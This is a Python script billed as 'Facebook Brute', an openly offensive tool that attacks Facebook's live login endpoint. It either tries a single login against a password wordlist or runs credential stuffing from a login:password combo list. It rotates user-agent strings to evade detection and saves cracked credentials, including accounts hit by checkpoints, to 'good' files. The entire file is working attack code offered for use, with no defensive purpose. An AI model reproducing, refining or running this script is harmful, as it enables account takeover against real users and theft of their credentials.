#Coder--Dr.Hohol---
import requests as r
from termcolor import colored as cd
import random
import time

inf = '''
=========Facebook Brute==========
==========Version 0.5.3==========
==========Coder:Dr.Hohol=========   '''
print(cd(inf, 'blue'))
url = 'https://www.facebook.com/login.php'



agents = [
'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.3',
'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36',
'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1'
]

headers = {'Cookie':'locale=es_LA'}                                                                 
headers['User-Agent'] = random.choice(agents) 
headers['Accept'] = 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
headers['Content-type'] = "application/x-www-form-urlencoded"
headers['Accept-Charset'] = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
s = r.Session()

usr_data = {}
usr_data['login'] = 'Entrar'
usr_data['timezone'] = 360
usr_data['return_session'] = 0
usr_data['session_key_only'] = 0
usr_data['legacy_return'] = 1
usr_data['trynum'] = 1
usr_data['display'] = ''
usr_data['persistent'] = 1
usr_data['default_persistent'] = 1
usr_data['ajax'] = 'ajax'
def list():
    global wordlist       
    wordlist = input('wordlist(full route): ')
    try:
        global  passw 
        passw = open(wordlist,'r').readlines()
    except FileNotFoundError:
        print('File not found, try again')
        list()
def combo_list():
    global cmb       
    cmb = input('combolist: ')
    try:
        global  base 
        base = open(cmb,'r').read().split('\n')
    except FileNotFoundError:
        print('File not found, try again')
        combo_list()
def combo():
    combo_list()
    good = open('good' + str(time.ctime()) + '.txt','w')
    bad = open('bad' + str(time.ctime()) + '.txt','w')
    for line in base:
        try:
            login = line.split(':')[0].strip()
            password = line.split(':')[1].strip()
        except IndexError:
            print('FINISHED')
            exit()
        usr_data['email'] = login
        usr_data['pass'] = password
        res = s.post(url, headers=headers, data=usr_data)
        if res.url == 'https://www.facebook.com/login.php':
            print(cd('BAD  ' + login + ':' + password,'red'))
            bad.write(login + ':' + password + '\n')
        elif res.url == 'https://www.facebook.com/':
            print(cd('GOOD  ' + login + ':' + password, 'green'))
            good.write(login + ':' + password + '\n')
        elif res.url == 'https://www.facebook.com/checkpoint/?next':
            good.write(login + ':' + password + '    NEED CHECKPOIN(MAYBE BAN)' + '\n')
            print(cd('good, but need checkpoint', 'blue'))
            print(cd(login + ":" + password, 'blue'))
        else:
            print('something wrong')
def single():
    login = input('Login for facebook: ')
    list()
    print('Start cracking...')
    for line in passw:
        time.sleep(0.5)
        pwd = line.strip()
        usr_data = {}
        usr_data['email'] = login
        usr_data['pass'] =  pwd
        s = r.Session()
        res = s.post(url, data=usr_data, headers=headers)
        if res.url != "https://www.facebook.com/login.php":
            print (cd("[!]==========PASSWORD CRACKED: " + pwd + "===========", 'green'))
            break
        else:
            print (cd("[!]password incorrect: " + pwd, 'red'))
            headers['User-Agent'] = random.choice(agents)
def main():
    method = input('''select method:
    1.single brute(1 login and password list)
    2.combo brute(base login:password)\n''')
    if method == '1':
        single()
    elif method == '2':
        combo()
    else:
        print('there is no such function')
        main()
try:
    main()
except KeyboardInterrupt:
    print('\nExiting...')